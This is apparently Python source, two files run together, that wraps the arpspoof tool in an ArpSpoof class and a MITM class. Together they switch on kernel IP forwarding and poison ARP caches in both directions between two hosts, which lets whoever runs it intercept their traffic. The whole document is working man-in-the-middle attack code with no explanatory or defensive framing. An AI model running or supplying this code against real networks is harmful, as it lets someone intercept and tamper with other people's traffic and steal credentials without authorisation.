


import subprocess
import signal


class ArpSpoof:
    def __init__(self, target_ip: str, visible_ip: str, interface: str = "eth0"):
        self.target_ip  = target_ip
        self.visible_ip = visible_ip
        self.interface  = interface
        self._process: subprocess.Popen | None = None

    def start(self) -> None:
        self._process = subprocess.Popen(
            ["arpspoof", "-i", self.interface, "-t", self.target_ip, self.visible_ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

    def stop(self) -> None:
        if self._process is None:
            return
        self._process.send_signal(signal.SIGINT)
        self._process.wait()
        self._process = None

    @property
    def is_running(self) -> bool:
        return self._process is not None and self._process.poll() is None

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *args):
        self.stop()



def enable_ip_forwarding() -> None:
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")


def disable_ip_forwarding() -> None:
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("0")





import subprocess
import signal


class MITM:
    def __init__(self, target1_ip: str, target2_ip: str, interface: str = "eth0"):
        self.target1_ip = target1_ip
        self.target2_ip = target2_ip
        self.interface  = interface
        self._spoof_to_target1: subprocess.Popen | None = None
        self._spoof_to_target2: subprocess.Popen | None = None

    def start(self) -> None:
        self._enable_ip_forwarding()
        self._spoof_to_target1 = self._start_arpspoof(self.target1_ip, self.target2_ip)
        self._spoof_to_target2 = self._start_arpspoof(self.target2_ip, self.target1_ip)

    def stop(self) -> None:
        self._stop_arpspoof(self._spoof_to_target1)
        self._stop_arpspoof(self._spoof_to_target2)
        self._spoof_to_target1 = None
        self._spoof_to_target2 = None
        self._disable_ip_forwarding()

    @property
    def is_running(self) -> bool:
        return (
            self._spoof_to_target1 is not None and self._spoof_to_target1.poll() is None and
            self._spoof_to_target2 is not None and self._spoof_to_target2.poll() is None
        )

    def _start_arpspoof(self, target_ip: str, visible_ip: str) -> subprocess.Popen:
        return subprocess.Popen(
            ["arpspoof", "-i", self.interface, "-t", target_ip, visible_ip],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )

    def _stop_arpspoof(self, process: subprocess.Popen | None) -> None:
        if process is None:
            return
        process.send_signal(signal.SIGINT)
        process.wait()

    def _enable_ip_forwarding(self) -> None:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")

    def _disable_ip_forwarding(self) -> None:
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("0")

    def __enter__(self):
        self.start()
        return self

    def __exit__(self, *args):
        self.stop()
    